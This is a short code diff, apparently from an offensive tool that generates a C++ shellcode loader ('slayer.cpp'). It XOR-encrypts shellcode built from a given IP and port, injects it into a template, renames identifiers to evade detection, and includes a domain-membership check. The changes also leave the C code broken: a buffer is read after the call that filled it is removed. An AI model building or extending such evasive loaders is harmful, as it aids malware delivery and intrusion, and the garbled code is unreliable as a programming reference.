@@ -40,13 +40,15 @@ def create_template():
 #define SECURITY_WIN32
 #define __WIN32_WINNT 0x0A00
 #include <secext.h>
-#include <Security.h>
+#include <security.h>
+
+#define UNICODE
+
 
 
 BOOL Isdomainjoined(LPCWSTR domain) {
-    WCHAR buffer[MAX_BUFFER_SIZE];
-    GetEnvironmentVariable(L"USERDOMAIN", buffer, 256);
-    BOOL bResult = FALSE;
+         WCHAR buffer[MAX_BUFFER_SIZE];
+     BOOL bResult = FALSE;
     DWORD dwSize = MAX_BUFFER_SIZE;
     WCHAR* position = wcsstr(buffer, L"\\");
 
@@ -115,11 +117,8 @@ def slayer(payload_type, ip, port, arch):
     time.sleep(1)
     data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
     data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
-    data = data.replace("buf", buf)
     data = data.replace("key", xorkey)
     data = data.replace("shellcode", shellcode)
-    data = data.replace("monitorInfo", monitorinfo)
-    data = data.replace("systemInfo", systemInfo)
 
     template.close()
     template = open("slayer.cpp", "w+")
